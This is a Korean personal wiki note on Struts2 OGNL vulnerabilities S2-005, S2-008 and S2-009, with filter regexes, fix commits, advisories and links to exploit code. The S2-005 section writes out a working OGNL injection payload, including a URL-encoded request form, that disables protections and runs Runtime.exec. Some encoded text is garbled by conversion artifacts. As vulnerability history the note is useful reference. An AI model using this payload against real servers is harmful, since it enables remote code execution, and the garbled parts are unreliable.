@@ -1,0 +1,124 @@
+<https://github.com/kantega/notsoserial>
+
+# Struts2
+
+참고 : OGNL 명세
+www.ognl.org/2.6.9/Documentation/html/LanguageGuide/expressionEvaluation.html
+
+2.1.8 (2009/09/30) : "\[\[\\p{Graph}\\s\]&&\[^,#:=\]\]**" 2.2.1
+(2010/08/16) : "\[a-zA-Z0-9\\.\\\]\\\\(\\)\_'\\s\]" 2.3.1.1 (2011/12/25)
+: "\[a-zA-Z0-9\\.\\\]\\\[\\(\\)\_'\]" 2.3.1.2 (2012/01/22) :
+"\\w+<span class="indexterm"
+primary="\\.\\w+)|(\\[\\d+\\])|(\\(\\d+\\"></span>\\.\\w+)\|(\\\[\\d+\\\])\|(\\(\\d+\\\|(\\\['\\w+'\\\])\|(\\('\\w+'\\)))**";
+
+## s2-005, CVE-2010-1870
+
+<http://struts.apache.org/development/2.x/docs/s2-005.html>
+
+- 2010년 5월31일날 보고.
+  :http://securityreason.com/exploitalert/8435\[<http://securityreason.com/exploitalert/8435>\]
+- 2010년 6월 20일날 소스 고침:
+  <http://svn.apache.org/viewvc?view=revision&revision=956389>
+- 2010년 8월16일에 release된 2.2.1에 포함 :
+  <http://struts.apache.org/2.2.1/docs/version-notes-221.html>
+
+<http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html> 참고
+
+\#\_memberAccess\['allowStaticMethodAccess'\] = true#foo = new java
+.lang.Boolean("false")#context\['xwork.MethodAccessor.denyMethodExecution'\]
+= \#foo#rt = @java.lang.Runtime@getRuntime()#rt.exec('mkdir /tmp/PWNED')
+
+[\\allowStaticMethodAccess\\](http://mydomain/MyStruts.action?('\u0023_memberAccess)')(meh)=true&(aaa)<span class="indexterm"
+primary="'\u0023context[\'xwork.MethodAccessor.den yMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;"></span>'\u0023context\[\\xwork.MethodAccessor.den
+yMethodExecution\\\]\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")&(asdf)<span class="indexterm"
+primary="'\u0023rt.exit(1)')(\u0023rtu003d@java.lang.Runtime@getRuntime("></span>'\u0023rt.exit(1)')(\u0023rtu003d@java.lang.Runtime@getRuntime()=1
+
+\u0023 = '#'
+
+### 관련 Commit
+
+2010/ 6/20
+<https://github.com/apache/struts2/commit/0c367776762b25c567b415ac4c2b0e48042cf34f>
+<https://github.com/apache/struts2/commit/3008f2609e59c9aba7ead68c7be6fdcb075520f6>
+
+<http://sebug.net/exploit/19954/>
+
+## s2-008
+
+<http://struts.apache.org/development/2.x/docs/s2-008.html>
+
+<http://www.brucephillips.name/blog/index.cfm/2011/2/19/Struts-2-Security-Vulnerability—​Dynamic-Method-Invocation>
+참고
+
+\<constant name="struts.enable.DynamicMethodInvocation" value="false"
+/\> struts.enable.DynamicMethodInvocation = false
+
+Strict DMI mode
+
+### 관련 commit
+
+2012/12/24 :
+<https://github.com/apache/struts2/commit/41f90ae39d0783f64641726e7e6b4741663c04bd>
+
+## s2-009 , CVE-2011-3923
+
+<http://struts.apache.org/development/2.x/docs/s2-009.html>
+
+<http://packetstormsecurity.com/files/cve/CVE-2011-3923>
+
+'While investigating SEC Consult’s Struts2 bugs (cool bugs, btw!), I’ve
+realized that due to the fact that Struts2 still allowed OGNL expression
+evaluation via parentheses I could evaluate OGNL expressions stored in
+action attributes (HTTP parameter values effectively), resulting in
+arbitrary code execution in Struts2 applications with default
+configuration (i.e. using the "params" interceptor), very similar to
+CVE-2010-1870..
+
+<http://blog.o0o.nu/2012/01/cve-2011-3923-yet-another-struts2.html>
+
+공격 코드는 : <http://www.securityfocus.com/bid/55165/exploit> ,
+<http://packetstormsecurity.com/files/120908/struts_code_exec_parameters.rb.txt>
+관련포럼: <http://seclists.org/bugtraq/2012/Aug/135>
+
+### 관련 commit
+
+2012/01/19 :
+<https://github.com/apache/struts2/commit/2c1eb6bb57f90db7287fc3ed0086793d0a43fe9e>
+
+## Related
+- [[effective-java]]
+- [[java-annotation]]
+- [[java-basic]]
+- [[java-basic-summary]]
+- [[java-bytecode]]
+- [[java-concurrency]]
+- [[java-date]]
+- [[java-dto]]
+- [[java-ee-pattern]]
+- [[java-encoding]]
+- [[java-external-process]]
+- [[java-fast-boot]]
+- [[java-fiber]]
+- [[java-functional-library]]
+- [[java-gc]]
+- [[java-json-parser]]
+- [[java-lambda]]
+- [[java-memory-model]]
+- [[java-multiline-string]]
+- [[java-native-memory]]
+- [[java-performance]]
+- [[java-process-call]]
+- [[java-profiling]]
+- [[java-puzzler]]
+- [[java-references]]
+- [[java-string]]
+- [[java-thread-dump]]
+- [[java-tips]]
+- [[java-web-framework]]
+- [[jvm]]
+- [[oauth]]
+- [[openjdk]]
+- [[security]]
+- [[spring-security]]
+- [[sql-injection]]
+- [[xml-injection]]
